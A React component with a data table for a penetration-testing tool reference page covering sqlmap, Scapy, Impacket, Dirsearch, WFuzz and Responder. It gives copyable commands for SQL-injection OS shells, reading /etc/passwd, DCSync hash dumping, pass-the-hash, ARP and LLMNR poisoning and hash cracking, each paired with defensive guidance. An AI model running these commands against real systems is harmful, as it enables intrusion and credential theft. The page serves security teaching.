import React from 'react';
import { motion } from 'motion/react';

export type ToolKey = 'sqlmap' | 'scapy' | 'impacket' | 'dirsearch' | 'wfuzz' | 'responder';

export interface ToolDocumentation {
  id: ToolKey;
  name: string;
  badge: string;
  category: string;
  color: 'warning' | 'info' | 'danger' | 'success' | 'primary' | 'light';
  icon: string;
  whatItIs: string;
  howItsUsed: string;
  quickCode: string;
  officialUrl: string;
  officialLabel: string;
  license: string;
  techniquesTitle: string;
  techniquesSummary: string;
  techniquesList: string[];
  advancedCommands: { command: string; desc: string }[];
  defenseGuidelines: string[];
}

export const TOOLS_DATA: Record<ToolKey, ToolDocumentation> = {
  sqlmap: {
    id: 'sqlmap',
    name: 'SQLMap',
    badge: '{Python}',
    category: 'Automated SQL Injection & Database Takeover Suite',
    color: 'warning',
    icon: 'fa-solid fa-database',
    whatItIs: 'An open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over database servers.',
    howItsUsed: 'Used by security auditors and ethical hackers to scan web applications, identify injection sinks, dump tables, read remote file systems, and execute OS commands.',
    quickCode: `# Basic SQL injection scan against parameter
sqlmap -u "http://target.com/page.php?id=1"

# Enumerate all accessible databases
sqlmap -u "http://target.com/page.php?id=1" --dbs

# Dump tables and records from target database
sqlmap -u "http://target.com/page.php?id=1" -D app_db -T users --dump

# Obtain interactive OS shell via SQL injection
sqlmap -u "http://target.com/page.php?id=1" --os-shell`,
    officialUrl: 'https://sqlmap.org/',
    officialLabel: 'sqlmap.org',
    license: 'GPLv2',
    techniquesTitle: 'Supported SQL Injection Techniques',
    techniquesSummary: 'SQLMap contains a powerful detection engine that automatically fingerprints the DBMS (MySQL, Oracle, PostgreSQL, Microsoft SQL Server, SQLite, MariaDB) and tests six distinct injection categories:',
    techniquesList: [
      'Boolean-based Blind: Evaluates TRUE/FALSE SQL query responses when no error or database output is returned directly on screen.',
      'Time-based Blind: Injects sleep or heavy compute queries (SLEEP(5), pg_sleep(5), WAITFOR DELAY) and measures HTTP response latency.',
      'Error-based: Forces the backend DBMS to output syntax errors containing raw database records (ExtractValue, floor(rand())).',
      'UNION Query-based: Appends UNION SELECT statements to join attacker payloads directly into legitimate application output columns.',
      'Stacked Queries: Executes multiple contiguous SQL commands separated by semicolons (INSERT, UPDATE, DROP, EXEC).',
      'Out-of-Band (OOB): Forces the database server to perform DNS lookups or HTTP requests (xp_dirtree, UTL_HTTP) to exfiltrate data.'
    ],
    advancedCommands: [
      {
        command: 'sqlmap -u "http://target.com/item.php?id=1" --batch --random-agent',
        desc: 'Run non-interactively with default answers, automatically rotating User-Agent headers.'
      },
      {
        command: 'sqlmap -u "http://target.com/item.php?id=1" --tamper=space2comment,between',
        desc: 'Obfuscate payload using tamper scripts to bypass Web Application Firewalls (WAF) and IDS filters.'
      },
      {
        command: 'sqlmap -r burp_request.txt -p id --level=5 --risk=3',
        desc: 'Parse raw HTTP request file exported from Burp Suite, testing injection at maximum depth.'
      },
      {
        command: 'sqlmap -u "http://target.com/page.php?id=1" --sql-shell',
        desc: 'Spawn a pseudo-interactive SQL command prompt directly in the target database.'
      },
      {
        command: 'sqlmap -u "http://target.com/page.php?id=1" --file-read="/etc/passwd"',
        desc: 'Read arbitrary files from the server filesystem via DBMS file loading functions.'
      },
      {
        command: 'sqlmap -u "http://target.com/item.php?id=1" --os-pwn --priv-esc',
        desc: 'Escalate privileges through Metasploit and DBMS stored procedure injection.'
      }
    ],
    defenseGuidelines: [
      'Parameterized Queries: Always enforce Prepared Statements with parameterized inputs across all application database queries.',
      'Object-Relational Mapping (ORM): Use secure ORMs with built-in parameter binding, and avoid dynamic raw string concatenation.',
      'Principle of Least Privilege: Restrict database user accounts so the web tier cannot access administrative stored procedures or sys tables.',
      'Web Application Firewall (WAF): Implement deep inspection rules to detect and reject SQL syntax anomalies in query strings and headers.'
    ]
  },
  scapy: {
    id: 'scapy',
    name: 'Scapy',
    badge: '{Python}',
    category: 'Interactive Packet Manipulation & Network Probing Engine',
    color: 'info',
    icon: 'fa-solid fa-network-wired',
    whatItIs: 'A powerful interactive packet manipulation program and Python library capable of forging, decoding, transmitting, and analyzing network packets.',
    howItsUsed: 'Used for network scanning, custom protocol fuzzing, tracerouting, packet sniffing, ARP cache poisoning simulations, and security testing.',
    quickCode: `# Launch interactive Scapy shell
scapy

# Craft and transmit an ICMP Echo Request
>>> send(IP(dst="192.168.1.1")/ICMP())

# Send TCP SYN packet and capture first response
>>> reply = sr1(IP(dst="192.168.1.1")/TCP(dport=80, flags="S"), timeout=2)

# Passive packet sniffer (captures 10 packets on eth0)
>>> sniff(iface="eth0", count=10, prn=lambda x: x.summary())`,
    officialUrl: 'https://scapy.net/',
    officialLabel: 'scapy.net',
    license: 'GPLv2',
    techniquesTitle: 'Multi-Layer Packet Manipulation Capabilities',
    techniquesSummary: 'Scapy stacks network layers together using Python operator overloading (the / operator), giving engineers total control over every byte in IP, TCP, UDP, ARP, ICMP, DNS, and DHCP headers:',
    techniquesList: [
      'Layer Stacking: Compose raw Ethernet frames with Ether()/IP()/TCP()/Raw(load="PAYLOAD") with automatic checksum computation.',
      'Stealth Port Scanning: Construct custom half-open SYN packets without completing the three-way handshake, bypassing basic connection logs.',
      'Layer 2 ARP Injection: Forge gratuitous ARP replies to simulate Man-in-the-Middle (MitM) cache poisoning in lab environments.',
      'PCAP Ingestion & Export: Read existing Wireshark .pcap captures with rdpcap() and save manipulated packet streams using wrpcap().',
      'Visual 3D Routing & Traceroute: Perform multi-path traceroutes that map routing topology across global networks.'
    ],
    advancedCommands: [
      {
        command: 'ans, unans = sr(IP(dst="192.168.1.0/24")/TCP(dport=[80,443,22], flags="S"), timeout=1)',
        desc: 'Multi-host concurrent TCP SYN port scanner across a subnet.'
      },
      {
        command: 'sendp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=2, psrc="192.168.1.1", pdst="192.168.1.50"), loop=1, inter=2)',
        desc: 'Transmit periodic ARP response frames to audit network ARP inspection defenses.'
      },
      {
        command: 'packets = sniff(iface="eth0", filter="tcp port 80 and host 192.168.1.100", count=50)',
        desc: 'Berkeley Packet Filter (BPF) capture targeting specific host traffic.'
      },
      {
        command: 'wrpcap("investigation.pcap", packets)',
        desc: 'Export captured packets to standard PCAP format for Wireshark inspection.'
      }
    ],
    defenseGuidelines: [
      'Dynamic ARP Inspection (DAI): Enable DAI on network switches to validate ARP packets against DHCP snooping binding tables.',
      '802.1X Port Authentication: Enforce hardware-level Network Access Control to prevent rogue devices from sending forged frames.',
      'IP Source Guard: Filter spoofed source IP addresses at the access switch layer.',
      'Network Intrusion Detection (NIDS): Deploy Suricata or Zeek to detect anomalous flag combinations (e.g., NULL scans or Xmas scans).'
    ]
  },
  impacket: {
    id: 'impacket',
    name: 'Impacket',
    badge: '{Python}',
    category: 'Active Directory & Windows Protocol Exploitation Suite',
    color: 'danger',
    icon: 'fa-solid fa-fingerprint',
    whatItIs: 'A comprehensive library of Python classes for working with network protocols, specifically focused on Microsoft Windows and Active Directory ecosystems.',
    howItsUsed: 'Essential for penetration testers auditing Windows domains, extracting hashes via DCSync, executing commands over SMB/WMI, and performing Kerberos attacks.',
    quickCode: `# Pass-the-Hash remote execution via SMB
psexec.py administrator@192.168.1.10 -hashes aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634

# Extract domain SAM & NTDS hashes via DCSync
secretsdump.py domain.local/admin:password@192.168.1.10

# Request Kerberos service ticket (Kerberoasting)
GetUserSPNs.py domain.local/user:password -request -dc-ip 192.168.1.10`,
    officialUrl: 'https://github.com/fortra/impacket',
    officialLabel: 'GitHub / Impacket',
    license: 'Apache 1.1',
    techniquesTitle: 'Windows Domain Attack Vectors & Protocols',
    techniquesSummary: 'Impacket implements low-level MSRPC, SMBv1/v2/v3, Kerberos, and LDAP, providing specialized tools for Active Directory lateral movement and credential extraction:',
    techniquesList: [
      'DCSync (MS-DRSR): Simulates Domain Controller replication behavior to dump all user password hashes directly from Active Directory NTDS.dit.',
      'Pass-the-Hash (PtH): Authenticates to remote systems using NTLM password hashes without requiring plaintext password conversion.',
      'Kerberoasting: Queries Active Directory for accounts with Service Principal Names (SPNs) and requests TGS tickets crackable offline.',
      'AS-REP Roasting: Requests Kerberos authentication data for users configured with "Do not require Kerberos preauthentication".',
      'WMI & SMB Command Execution: Runs shell commands via Windows Management Instrumentation (WMI) without spawning standard service binaries.'
    ],
    advancedCommands: [
      {
        command: 'secretsdump.py domain/user:pass@dc01.local -just-dc-ntlm',
        desc: 'Targeted DCSync extraction of Active Directory NTLM hash table.'
      },
      {
        command: 'wmiexec.py -hashes :209c6174da490caeb422f3fa5a7ae634 admin@10.0.0.15',
        desc: 'Semi-interactive stealth shell using Windows WMI process execution.'
      },
      {
        command: 'GetNPUsers.py domain.local/ -usersfile users.txt -no-pass',
        desc: 'AS-REP Roasting against user list to capture offline hash tickets.'
      },
      {
        command: 'smbclient.py domain/user:pass@10.0.0.15',
        desc: 'Interactive SMB client console for file browsing, upload, and download.'
      },
      {
        command: 'ticketConverter.py ticket.kirbi ticket.ccache',
        desc: 'Convert Kerberos ticket formats between Windows Mimikatz and Linux CCACHE.'
      }
    ],
    defenseGuidelines: [
      'Enforce SMB Signing: Require SMB signing across all Domain Controllers and member servers to prevent NTLM relaying.',
      'Protected Users Group: Add privileged accounts to Protected Users in Active Directory to disable NTLM caching and weak encryption.',
      'Local Administrator Password Solution (LAPS): Deploy LAPS to randomize unique local administrator credentials on all workstations.',
      'SIEM Event Auditing: Monitor Event ID 4662 (Directory Service Access with DS-Replication rights) and Event ID 4624 (Logon Type 3).'
    ]
  },
  dirsearch: {
    id: 'dirsearch',
    name: 'Dirsearch',
    badge: '{Python}',
    category: 'Web Path, Directory & Secret File Brute-Forcing',
    color: 'success',
    icon: 'fa-solid fa-folder-tree',
    whatItIs: 'A mature, high-performance command-line web path scanner designed to brute-force directories and hidden assets on web servers.',
    howItsUsed: 'Used during the reconnaissance phase of web security audits to discover admin consoles, exposed source repositories (.git), backup dumps, and API routes.',
    quickCode: `# Standard directory scan against target
python3 dirsearch.py -u "http://target.com"

# Scan with file extensions and 50 concurrent threads
python3 dirsearch.py -u "http://target.com" -e php,html,txt,json -t 50

# Use targeted custom wordlist and exclude status codes
python3 dirsearch.py -u "http://target.com" -w /opt/wordlists/common.txt --exclude-status 404,403`,
    officialUrl: 'https://github.com/maurosoria/dirsearch',
    officialLabel: 'GitHub / Dirsearch',
    license: 'GPLv2',
    techniquesTitle: 'Reconnaissance & Content Discovery Mechanics',
    techniquesSummary: 'Dirsearch optimizes HTTP connection pooling and concurrency to rapidly discover hidden attack surfaces before adversaries do:',
    techniquesList: [
      'Extension Recursion: Automatically appends common developer extensions (.php, .asp, .bak, .env, .sql, .swp) to path dictionaries.',
      'Recursive Directory Crawling: When a 200/301 response returns a subdirectory, Dirsearch can automatically descend and scan child paths.',
      'Heuristic 404 Calibration: Identifies custom non-standard 404 pages (soft-404s) based on response length and content fingerprints.',
      'Subdomain & Wordlist Brute-Forcing: Discovers vhosts and obscure endpoints using specialized lists (SecLists / Raft).',
      'Proxy Rotation: Integrates with Tor or upstream HTTP/SOCKS5 proxies to distribute scanning signatures across IPs.'
    ],
    advancedCommands: [
      {
        command: 'python3 dirsearch.py -u https://target.com -e env,bak,sql,zip,git,tar.gz -t 40',
        desc: 'Target high-value backup and source code archives.'
      },
      {
        command: 'python3 dirsearch.py -u https://target.com -r --max-recursion-depth 3',
        desc: 'Recursive deep crawl down to three nested directory levels.'
      },
      {
        command: 'python3 dirsearch.py -u https://target.com --random-agent --proxy socks5://127.0.0.1:9050',
        desc: 'Route requests through Tor SOCKS proxy with randomized User-Agent.'
      },
      {
        command: 'python3 dirsearch.py -u https://target.com -H "Authorization: Bearer <token>"',
        desc: 'Authenticated directory fuzzing behind API authorization headers.'
      }
    ],
    defenseGuidelines: [
      'Disable Directory Browsing: Ensure Apache Options -Indexes or Nginx autoindex off is enabled across all virtual hosts.',
      'Sanitize Production Deployments: Purge developer artifacts (.git/, .env, docker-compose.yml, README.md, test scripts) before release.',
      'Fail2ban & Rate Limiting: Apply IP rate limits for excessive 404/403 responses within sliding time windows.',
      'Obfuscate Sensitive Endpoints: Move administrative dashboards behind multi-factor authentication (MFA) and VPN boundaries.'
    ]
  },
  wfuzz: {
    id: 'wfuzz',
    name: 'WFuzz',
    badge: '{Python}',
    category: 'Modular Web Application & Parameter Security Fuzzer',
    color: 'primary',
    icon: 'fa-solid fa-vial',
    whatItIs: 'A flexible web application fuzzer created to facilitate security assessments by substituting placeholders with injected dictionary payloads.',
    howItsUsed: 'Used to test for unlinked resources, parameter tampering, authentication brute-forcing, SQLi/XSS injection points, and HTTP header anomalies.',
    quickCode: `# Fuzz directory path with wordlist
wfuzz -c -z file,wordlist.txt --hc 404 http://target.com/FUZZ

# Fuzz GET parameter name
wfuzz -c -z file,params.txt http://target.com/index.php?FUZZ=1

# Fuzz POST authentication form
wfuzz -c -z file,passwords.txt -d "user=admin&pass=FUZZ" http://target.com/login.php`,
    officialUrl: 'https://wfuzz.readthedocs.io/',
    officialLabel: 'wfuzz.readthedocs.io',
    license: 'GPLv2',
    techniquesTitle: 'Universal Payload Fuzzing Mechanics',
    techniquesSummary: 'WFuzz replaces the FUZZ keyword (or multi-payloads FUZ2Z, FUZ3Z) anywhere inside an HTTP request:',
    techniquesList: [
      'Multi-Point Payload Injection: Combine multiple dictionary lists simultaneously (e.g., username list + password list).',
      'HTTP Verb Tampering: Fuzz the HTTP method (GET, POST, PUT, DELETE, OPTIONS, TRACE) to find authorization bypasses.',
      'Header Injection: Inject payloads into User-Agent, Referer, X-Forwarded-For, and custom authorization headers.',
      'Granular Response Filtering: Hide responses by HTTP code (--hc), character count (--hc), word count (--hw), or line count (--hl).',
      'Virtual Host (VHost) Discovery: Detect private intranet hosts configured on the same shared IP address.'
    ],
    advancedCommands: [
      {
        command: 'wfuzz -c -z file,dirs.txt --sc 200,301,302 https://target.com/FUZZ',
        desc: 'Display only successful or redirecting HTTP status codes.'
      },
      {
        command: 'wfuzz -c -w vhosts.txt -H "Host: FUZZ.target.com" https://target.com/ --hw 25',
        desc: 'Virtual Host discovery filtering out default shared response lengths.'
      },
      {
        command: 'wfuzz -z range,1-1000 "https://target.com/profile?user_id=FUZZ"',
        desc: 'Insecure Direct Object Reference (IDOR) sequential parameter test.'
      },
      {
        command: 'wfuzz -c -z file,sqli.txt "https://target.com/search.php?q=FUZZ" --ss "syntax error"',
        desc: 'SQL injection payload fuzzing scanning for database error strings.'
      }
    ],
    defenseGuidelines: [
      'Strict Input Validation: Validate all input against allowlists, strict data types, and character ranges before processing.',
      'Rate Limiting & Throttling: Implement adaptive throttling per IP, session, and API token at the reverse proxy layer.',
      'Generic Error Handling: Never output raw database or runtime exceptions to client HTTP responses.',
      'WAF Inspection: Deploy Web Application Firewall rules to block automated scanning signatures and common fuzzing lists.'
    ]
  },
  responder: {
    id: 'responder',
    name: 'Responder',
    badge: '{Python}',
    category: 'LLMNR, NBT-NS & mDNS Credential Poisoner',
    color: 'light',
    icon: 'fa-solid fa-satellite',
    whatItIs: 'A powerful Python tool that performs LLMNR, NBT-NS, and MDNS broadcast poisoning, rogue authentication server simulation, and WPAD rogue proxying.',
    howItsUsed: 'Used in internal network penetration tests to capture NetNTLMv1 and NetNTLMv2 hashes, capture cleartext credentials, or relay them to other hosts.',
    quickCode: `# Start poisoned listener on network interface eth0
python3 Responder.py -I eth0

# Run in passive analysis mode (no spoofed replies sent)
python3 Responder.py -I eth0 -A

# Rogue WPAD proxy + Force Basic Auth for plaintext credentials
python3 Responder.py -I eth0 -wrf -b`,
    officialUrl: 'https://github.com/SpiderLabs/Responder',
    officialLabel: 'GitHub / Responder',
    license: 'GPLv3',
    techniquesTitle: 'Local Network Broadcast Poisoning Mechanics',
    techniquesSummary: 'When a Windows client attempts to resolve an internal host that does not exist in DNS, it falls back to broadcasting across the local subnet:',
    techniquesList: [
      'LLMNR & NBT-NS Spoofing: Claims ownership of queried hostnames, redirecting victims to authenticate against Responder.',
      'NetNTLMv2 Hash Capture: Stores intercepted challenge/response hashes in logs for offline password cracking using Hashcat.',
      'Rogue WPAD Proxy: Answers Web Proxy Auto-Discovery queries to become the default HTTP/HTTPS proxy for local domain clients.',
      'Credential Downgrade Attacks: Forces authentication prompts into Basic Auth to capture plaintext passwords over HTTP.',
      'NTLM Relaying Integration: Pairs with impacket ntlmrelayx to relay captured credentials into administrative SMB/LDAP sessions.'
    ],
    advancedCommands: [
      {
        command: 'python3 Responder.py -I eth0 -v',
        desc: 'Start poisoning with verbose live query output across all supported protocols.'
      },
      {
        command: 'python3 Responder.py -I eth0 -r -d -w',
        desc: 'Enable Rogue DHCP and WPAD server modules simultaneously.'
      },
      {
        command: 'hashcat -m 5600 responder_hashes.txt wordlist.txt -r rules/best64.rule',
        desc: 'Crack captured NetNTLMv2 hashes using Hashcat mode 5600.'
      },
      {
        command: 'python3 Responder.py -I eth0 -A',
        desc: 'Analyze-only mode to audit whether LLMNR or NBT-NS broadcasts exist on LAN.'
      }
    ],
    defenseGuidelines: [
      'Disable LLMNR via GPO: Group Policy > Computer Configuration > Administrative Templates > Network > DNS Client > Turn off multicast name resolution.',
      'Disable NetBIOS over TCP/IP: Configure DHCP scope option 043 (Vendor Specific Info) or network adapter properties.',
      'Enforce SMB Signing: Enable SMB Signing on all domain machines to completely neutralize NTLM relay attacks.',
      'Create WPAD DNS Record: Add a static DNS record for "wpad" pointing to a legitimate proxy or 127.0.0.1 to prevent rogue poisoning.'
    ]
  }
};

export interface ToolDetailSectionProps {
  toolKey: ToolKey;
  onSelectTool: (key: ToolKey) => void;
  onBack: () => void;
  copiedText: string | null;
  onCopy: (text: string) => void;
}

export const ToolDetailSection: React.FC<ToolDetailSectionProps> = ({
  toolKey,
  onSelectTool,
  onBack,
  copiedText,
  onCopy
}) => {
  const tool = TOOLS_DATA[toolKey] || TOOLS_DATA.sqlmap;
  const toolKeys: ToolKey[] = ['sqlmap', 'scapy', 'impacket', 'dirsearch', 'wfuzz', 'responder'];

  const currentIndex = toolKeys.indexOf(toolKey);
  const prevKey = toolKeys[(currentIndex - 1 + toolKeys.length) % toolKeys.length];
  const nextKey = toolKeys[(currentIndex + 1) % toolKeys.length];

  return (
    <section className="min-vh-100 pt-5 mt-5 pb-5">
      <div className="container">
        {/* Navigation & Breadcrumb Header */}
        <div className="d-flex justify-content-between align-items-center mb-4 flex-wrap gap-3">
          <div className="d-flex align-items-center gap-2">
            <button
              type="button"
              className="btn btn-outline-secondary font-monospace btn-sm d-flex align-items-center gap-2"
              onClick={onBack}
            >
              <i className="fa-solid fa-arrow-left"></i>
              <span>Back to Ethical Hacking Tools</span>
            </button>
            <span className="text-secondary small font-monospace d-none d-md-inline">
              / Cyber Labs / Documentation Manual
            </span>
          </div>

          {/* Quick Tool Selector Pills */}
          <div className="btn-group btn-group-sm font-monospace flex-wrap" role="group">
            {toolKeys.map((key) => {
              const item = TOOLS_DATA[key];
              const isActive = key === toolKey;
              return (
                <button
                  key={key}
                  type="button"
                  className={`btn ${
                    isActive
                      ? `btn-${item.color} text-black fw-bold`
                      : 'btn-dark text-secondary border-secondary'
                  }`}
                  onClick={() => {
                    onSelectTool(key);
                    window.scrollTo(0, 0);
                  }}
                >
                  {item.name}
                </button>
              );
            })}
          </div>
        </div>

        {/* Main Content Hero Banner */}
        <motion.div
          key={toolKey}
          initial={{ opacity: 0, y: 15 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.3 }}
          className="cyber-card p-4 p-md-5 mb-4 position-relative overflow-hidden"
        >
          {/* Decorative Corner Accents */}
          <div className={`position-absolute top-0 end-0 p-3 text-${tool.color} opacity-25`} style={{ pointerEvents: 'none' }}>
            <i className={`${tool.icon} fa-6x`}></i>
          </div>

          <div className="d-flex align-items-center gap-3 mb-3 flex-wrap">
            <div className={`p-3 rounded bg-dark border border-${tool.color} text-${tool.color}`}>
              <i className={`${tool.icon} fa-2x`}></i>
            </div>
            <div>
              <div className="d-flex align-items-center gap-2 flex-wrap">
                <h1 className={`text-${tool.color} font-monospace mb-0 fw-bold`}>
                  {tool.name}
                </h1>
                <span className="badge bg-dark border border-secondary text-secondary font-monospace">
                  {tool.badge}
                </span>
                <span className={`badge bg-${tool.color} text-black font-monospace fw-bold`}>
                  {tool.license}
                </span>
              </div>
              <p className="text-secondary font-monospace mb-0 small">
                {tool.category}
              </p>
            </div>
          </div>

          {/* Core Overview */}
          <div className="row g-4 mt-2">
            <div className="col-lg-6">
              <div className="bg-dark p-3 rounded border border-secondary border-opacity-25 h-100">
                <h6 className={`text-${tool.color} font-monospace mb-2`}>
                  <i className="fa-solid fa-circle-info me-2"></i>WHAT IT IS
                </h6>
                <p className="text-light mb-0 small leading-relaxed font-monospace">
                  {tool.whatItIs}
                </p>
              </div>
            </div>
            <div className="col-lg-6">
              <div className="bg-dark p-3 rounded border border-secondary border-opacity-25 h-100">
                <h6 className={`text-${tool.color} font-monospace mb-2`}>
                  <i className="fa-solid fa-crosshairs me-2"></i>HOW IT'S USED
                </h6>
                <p className="text-light mb-0 small leading-relaxed font-monospace">
                  {tool.howItsUsed}
                </p>
              </div>
            </div>
          </div>

          {/* Quick-Start Terminal Box */}
          <div className="mt-4">
            <div className="d-flex justify-content-between align-items-center mb-2">
              <h6 className="text-secondary font-monospace mb-0 small">
                <i className="fa-solid fa-terminal me-2 text-success"></i>QUICK-START CLI SYNTAX
              </h6>
              <span className="text-secondary small font-monospace">
                Click copy button on right to paste
              </span>
            </div>
            <div className={`d-flex align-items-start bg-dark p-3 rounded border border-${tool.color} border-opacity-50 position-relative`}>
              <pre
                className={`text-${tool.color} mb-0 small font-monospace`}
                style={{ flex: 1, whiteSpace: 'pre-wrap', overflowX: 'auto', margin: 0 }}
              >
                {tool.quickCode}
              </pre>
              <button
                type="button"
                className="btn btn-sm btn-outline-secondary ms-2 text-secondary hover-text-white"
                onClick={() => onCopy(tool.quickCode)}
                title="Copy command block"
              >
                <i className={`fa-solid ${copiedText === tool.quickCode ? 'fa-check text-success' : 'fa-copy'}`}></i>
              </button>
            </div>
          </div>

          {/* Deep-Dive: Techniques & Architecture */}
          <div className="mt-5">
            <h5 className={`text-${tool.color} font-monospace border-bottom border-${tool.color} border-opacity-25 pb-2 mb-3`}>
              <i className="fa-solid fa-layer-group me-2"></i>
              {tool.techniquesTitle}
            </h5>
            <p className="text-secondary font-monospace small mb-3">
              {tool.techniquesSummary}
            </p>
            <div className="row g-3">
              {tool.techniquesList.map((item, idx) => {
                const parts = item.split(':');
                const titlePart = parts[0];
                const descPart = parts.slice(1).join(':');
                return (
                  <div key={idx} className="col-md-6">
                    <div className="bg-black p-3 rounded border border-secondary border-opacity-25 h-100 font-monospace">
                      <span className={`text-${tool.color} fw-bold d-block mb-1 small`}>
                        <i className="fa-solid fa-chevron-right me-1 small"></i>
                        {titlePart}
                      </span>
                      <span className="text-secondary small leading-relaxed">
                        {descPart}
                      </span>
                    </div>
                  </div>
                );
              })}
            </div>
          </div>

          {/* Advanced CLI Flags Cheat Sheet */}
          <div className="mt-5">
            <h5 className={`text-${tool.color} font-monospace border-bottom border-${tool.color} border-opacity-25 pb-2 mb-3`}>
              <i className="fa-solid fa-code me-2"></i>
              ADVANCED CLI EXECUTION & PRODUCTION FLAGS
            </h5>
            <div className="d-flex flex-column gap-2">
              {tool.advancedCommands.map((item, idx) => (
                <div
                  key={idx}
                  className="bg-black p-3 rounded border border-secondary border-opacity-25 d-flex justify-content-between align-items-center flex-wrap gap-2 font-monospace"
                >
                  <div style={{ flex: 1, minWidth: '240px' }}>
                    <code className={`text-${tool.color} d-block mb-1 small`}>
                      {item.command}
                    </code>
                    <span className="text-secondary small">
                      {item.desc}
                    </span>
                  </div>
                  <button
                    type="button"
                    className="btn btn-sm btn-outline-secondary font-monospace py-0 px-2 text-secondary"
                    onClick={() => onCopy(item.command)}
                    title="Copy command"
                  >
                    <i className={`fa-solid ${copiedText === item.command ? 'fa-check text-success' : 'fa-copy'} me-1`}></i>
                    {copiedText === item.command ? 'COPIED' : 'COPY'}
                  </button>
                </div>
              ))}
            </div>
          </div>

          {/* Hardening, Defenses & Countermeasures */}
          <div className="mt-5">
            <h5 className="text-success font-monospace border-bottom border-success border-opacity-25 pb-2 mb-3">
              <i className="fa-solid fa-shield-halved me-2"></i>
              BLUE TEAM DEFENSIVE HARDENING & MITIGATION
            </h5>
            <div className="row g-3">
              {tool.defenseGuidelines.map((guideline, idx) => {
                const parts = guideline.split(':');
                const gTitle = parts[0];
                const gDesc = parts.slice(1).join(':');
                return (
                  <div key={idx} className="col-md-6">
                    <div className="bg-dark p-3 rounded border border-success border-opacity-25 h-100 font-monospace">
                      <span className="text-success fw-bold d-block mb-1 small">
                        <i className="fa-solid fa-lock me-1"></i>
                        {gTitle}
                      </span>
                      <span className="text-secondary small leading-relaxed">
                        {gDesc}
                      </span>
                    </div>
                  </div>
                );
              })}
            </div>
          </div>

          {/* Footer Actions & Reference */}
          <div className="mt-5 pt-3 border-top border-secondary border-opacity-25 d-flex justify-content-between align-items-center flex-wrap gap-3 font-monospace">
            <div className="d-flex align-items-center gap-3">
              <a
                href={tool.officialUrl}
                target="_blank"
                rel="noopener noreferrer"
                className={`btn btn-outline-${tool.color} btn-sm font-monospace d-flex align-items-center gap-2`}
              >
                <i className="fa-solid fa-arrow-up-right-from-square"></i>
                <span>Official Documentation ({tool.officialLabel})</span>
              </a>
              <span className="text-secondary small">
                License: <strong className="text-white">{tool.license}</strong>
              </span>
            </div>

            <div className="d-flex align-items-center gap-2">
              <button
                type="button"
                className="btn btn-dark text-secondary border-secondary btn-sm font-monospace"
                onClick={() => {
                  onSelectTool(prevKey);
                  window.scrollTo(0, 0);
                }}
              >
                <i className="fa-solid fa-arrow-left me-1"></i>
                Previous Tool
              </button>
              <button
                type="button"
                className={`btn btn-${tool.color} text-black fw-bold btn-sm font-monospace`}
                onClick={() => {
                  onSelectTool(nextKey);
                  window.scrollTo(0, 0);
                }}
              >
                Next Tool
                <i className="fa-solid fa-arrow-right ms-1"></i>
              </button>
            </div>
          </div>
        </motion.div>
      </div>
    </section>
  );
};
